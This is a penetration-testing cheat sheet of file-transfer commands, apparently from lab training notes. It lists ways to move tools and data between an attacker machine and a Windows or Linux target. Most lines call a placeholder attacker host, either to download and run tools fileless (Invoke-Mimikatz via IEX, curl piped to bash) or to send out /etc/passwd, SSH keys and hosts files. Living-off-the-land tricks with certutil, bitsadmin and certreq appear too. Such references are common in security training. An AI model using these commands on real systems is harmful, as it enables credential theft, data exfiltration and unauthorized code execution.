# File Transfers Cheat Sheet

## Windows

### Downloads

**PowerShell Base64 Encode & Decode**
````
- Pwnbox Encode SSH Key to Base64 -
$ cat id_rsa |base64 -w 0;echo
- Windows Decode -
> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("encode64_content"))
````

**PowerShell Web Downloads**
````
- File Download -
> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
> (New-Object Net.WebClient).DownloadFile('https://<iP>/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
------------------------------------------
- DownloadString - Fileless Method -
> IEX (New-Object Net.WebClient).DownloadString('https://<IP>/Invoke-Mimikatz.ps1')
> (New-Object Net.WebClient).DownloadString('https://<IP>/Invoke-Mimikatz.ps1') | IEX
------------------------------------------
- Invoke-WebRequest -
> Invoke-WebRequest https://<IP>/PowerView.ps1 -OutFile PowerView.ps1
> Invoke-WebRequest -Uri https://<IP>/PowerView.ps1 -OutFile PowerView.ps1
> iwr https://<IP>/PowerView.ps1 -OutFile PowerView.ps1
````

**SMB Downloads**
````
- Setup SMB server in our attack machine: -
$ sudo impacket-smbserver share -smb2support $(pwd)
$ sudo impacket-smbserver share -smb2support .
$ sudo impacket-smbserver share -smb2support /Path_to_Directory
$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test (If want authentication)
----------------------------------------------------------------------------------
- Windows -
> copy \\<IP_Attacker>\share\nc.exe
> xcopy \\<IP_Attacker>\share\nc.exe .
- Mount the SMB Server with Username and Password -
> net use n: \\<IP_Attacker>\share /user:test test 
> Copy-Item "\\server\share\file.txt" "C:\local\file.txt" (Powershell)
````

**FTP Downloads**
````
-  Setup FTP server in our attack machine -
$ sudo pip3 install pyftpdlib
$ sudo python3 -m pyftpdlib --port 21
----------------------------------------------------------------------------------
- Windows -
> (New-Object Net.WebClient).DownloadFile('ftp://<IP_Attacker>/file.txt', 'C:\Users\Public\ftp-file.txt')
- Create a command file foe the ftp client and download the target file -
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
- Simple use FTP client -
ftp <IP_Attacker>
user: anonymous
````

### Uploads

**Base64 Encode & Decode**
````
> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
````

**Web Uploads**
````
- Setup HTTP Upload server in our machine -
$ pip3 install uploadserver
$ python3 -m uploadserver
-------------------------------------------------------------------------------------------
- Windows -
> Invoke-FileUpload -Uri http://<IP_Attacker>:8000/upload -File file_path
> Invoke-FileUpload -Uri http://<IP_Attacker>:8000/upload -File C:\Windows\System32\drivers\etc\hosts
-------------------------------------------------------------------------------------------
- Base64 Web Upload -
$ nc -lvnp 8000 (Our machine)
> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
````

**SMB Upload**
````
- Setup SMB server first in our attacker machine -
---------------------------------------------------
- Windows -
> copy C:\Users\john\Desktop\SourceCode.zip \\<IP_Attacker>\DavWWWRoot\
> copy C:\Users\john\Desktop\SourceCode.zip \\<IP_Attacker>\sharefolder\
> xcopy C:\Users\john\Desktop\SourceCode.zip \\<IP_Attacker>\DavWWWRoot\
> xcopy C:\Users\john\Desktop\SourceCode.zip \\<IP_Attacker>\sharefolder\
> Copy-Item "C:\local\file.txt" "\\server\share\file.txt" (Powershell)
````

**FTP Uploads**
````
- Setup ftp server -
$ sudo python3 -m pyftpdlib --port 21 --write
------------------------------------------------
- Windows -
> (New-Object Net.WebClient).UploadFile('ftp://<IP_Attacker>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
````

## Linux

### Downloads

**Base64 Encoding / Decoding**
````
echo -n 'base64_content' | base64 -d > id_rsa
````

**Wget and cURL**
````
$ wget https://<IP_Attacker>/LinEnum.sh -O /tmp/LinEnum.sh
$ wget https://<IP_Attacker>/LinEnum.sh
$ curl -o /tmp/LinEnum.sh https://<IP_Attacker>/LinEnum.sh
------------------------------------------------------------------------------
- Fileless -
$ curl https://<IP_Attacker>/LinEnum.sh | bash
$ wget -qO- https://<IP_Attacker>/helloworld.py | python3
````

**SSH**
````
$ scp file_download <user>@<IP>:<path_directoru>
````

### Uploads

**Base64 Encoding / Decoding**
````
cat file | base64
````

**cURL**
````
$ curl -X POST https://<IP_Attacker>/upload -F 'files=@/etc/passwd'
------------------------------------------------------------------------
- Setup python webserver on victim machine and use curl or wget to download the files to our attacker machine -
````

**SSH**
````
$ scp <user>@<IP>:<path_file> .
````

## Transferring File with Code

###  Downloads

**Python 2 & 3**
````
$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://<IP_Attacker>/LinEnum.sh", "LinEnum.sh")'
$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://<IP_Attacker>/LinEnum.sh", "LinEnum.sh")'
````

**PHP**
````
$ php -r '$file = file_get_contents("https://<IP_Attacker>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://<IP_Attacker>/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

$ php -r '$lines = @file("https://<IP_Attacker>/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
````

**Ruby & Perl**
````
$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://<IP_Attacker>/LinEnum.sh")))'
$ perl -e 'use LWP::Simple; getstore("https://<IP_Attacker>/LinEnum.sh", "LinEnum.sh");'
````

**Javascript**
````
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

> cscript.exe /nologo wget.js https://<IP_Attacker>/PowerView.ps1 PowerView.ps1
````

**VBScript**
````
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

> cscript.exe /nologo wget.vbs https://<IP_Attacker>/PowerView.ps1 PowerView2.ps1
````

### Upload

**Python3**
````
$ python3 -c 'import requests;requests.post("http://<IP_Attacker>:8000/upload",files={"files":open("/etc/passwd","rb")})'
````

## Miscellaneous

**Netcat**
````
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
$ nc -q 0 <victim_ip> 8000 < SharpKatz.exe
ncat --send-only <victim_ip> 8000 < SharpKatz.exe
---------------------------------------------------------------
$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
victim@target:~$ nc <IP_Attacker> 443 > SharpKatz.exe
$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
victim@target:~$ ncat <IP_Attacker> 443 --recv-only > SharpKatz.exe
````

**PowerShell Session File Transfer**
````
- Create a PowerShell Remoting Session -
> $Session = New-PSSession -ComputerName DATABASE01
- Copy samplefile.txt from our Localhost to the DATABASE01 Session -
> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
- Copy DATABASE.txt from DATABASE01 Session to our Localhost -
> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
````

**RDP**
````
$ rdesktop <IP> -d <domain> -u <user> -p '<password>' -r disk:linux='<directory>'
$ xfreerdp /v:<IP> /d:<domain> /u:<user> /p:'<password>' /drive:linux,<directory>
````

## Living off The Land

**Upload win.ini to our Pwnbox**
````
> certreq.exe -Post -config http://<IP_Attacker>:8000/ c:\windows\win.ini
````

**File Download with Bitsadmin**
````
> bitsadmin /transfer wcb /priority foreground http://<IP_Attacker>:8000/nc.exe C:\Users\<user>\Desktop\nc.exe
> Import-Module bitstransfer; Start-BitsTransfer -Source "http://<IP_Attacker>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
````

**Certutil**
````
> certutil.exe -verifyctl -split -f http://<IP_Attacker>:8000/nc.exe
````

= Find download feature =
https://lolbas-project.github.io/
https://gtfobins.github.io/
